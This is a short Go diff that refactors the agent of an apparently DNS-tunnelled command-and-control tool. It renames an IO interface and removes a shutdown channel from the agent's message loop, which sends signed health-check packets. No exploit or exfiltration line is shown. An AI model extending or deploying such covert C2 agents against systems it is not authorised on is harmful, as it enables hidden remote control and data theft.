@@ -23,7 +23,7 @@ var Config struct {
 	ServerPublicKeyBase36 string
 	serverPublicKey       *cryptography.PublicKey
 	DnsSuffix             string
-	io                    AgentIO
+	io                    IO
 }
 
 // loglevel constants
@@ -35,13 +35,11 @@ const (
 	FATAL
 )
 
-type AgentIO interface {
+type IO interface {
 	Logger(level uint8, format string, args ...interface{})
 	GetInputFeed() chan string
 	GetOutputFeed() chan string
 }
-
-var exiting chan bool
 
 // this is where all the multi-part packets will live. The key is parentPartID
 var PacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)
@@ -225,7 +223,7 @@ func sendHealthCheck() error {
 	return nil
 }
 
-func RunAgent(serverIo AgentIO) {
+func RunAgent(serverIo IO) {
 	Config.io = serverIo
 	if Config.ServerAddress == "" {
 		systemDNS, _ := dns.ClientConfigFromFile("/etc/resolv.conf")
@@ -275,9 +273,6 @@ func RunAgent(serverIo AgentIO) {
 	go func() {
 		for {
 			select {
-			case <-exiting:
-				// When exiting, return immediately
-				return
 			case <-status.MessageTicker.C:
 				if status.NextMessageType == c2.MessageHealthcheck {
 					if err := sendHealthCheck(); err != nil {
